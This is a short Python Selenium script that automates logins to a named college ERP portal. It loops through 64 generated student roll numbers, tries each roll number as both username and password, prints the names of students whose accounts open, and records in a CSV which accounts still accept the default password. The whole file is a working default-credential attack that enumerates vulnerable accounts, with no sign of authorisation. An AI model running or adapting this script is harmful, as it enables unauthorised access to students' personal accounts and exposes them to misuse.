"""
this file is for bot 
"""


from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import csv 


# path of driver in your device
PATH ="chromedriver.exe"


driver = webdriver.Chrome(PATH)
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")


def bot(username,password):
    """it log in the college site with (arg )username and password return Yes if user changed password esle no """

    # finding the log in text box
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()

    # entering the username 
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)

    # entering the password 
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    

    # tring to locate the name of the student 
    # if it is failed it means the user changed password 
    is_password_change = 0
    try :
        name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
        print(name.text)
    except :
        is_password_change= "yes"
        print(username + "changed password")
    finally :
        driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")

    if is_password_change:
        return "Yes"
    return "No"
    


def run(start,stop):
    # creating and opening csv file for analysis
    # csv file with columns rollno and is_password_changed  
    file = open('test.csv',"w")
    header = ["rollno","is_password_changed"]
    file_writer = csv.writer(file)
    file_writer.writerow(header)   


    # loop creating roll numbers from start to end 
    for i in range(1,65):
        if i <= 9 :
            roll = "0"+str(i)
        else :
            roll = str(i)
        username = "20JR1A44"+roll 
        password = "20JR1A44"+roll

        # checking whether a user  is  changed password or not
        is_password_changed = bot(username,password)

        # writing to csv file
        record = [username,is_password_changed]
        file_writer.writerow(record)

run(1,65)
driver.close()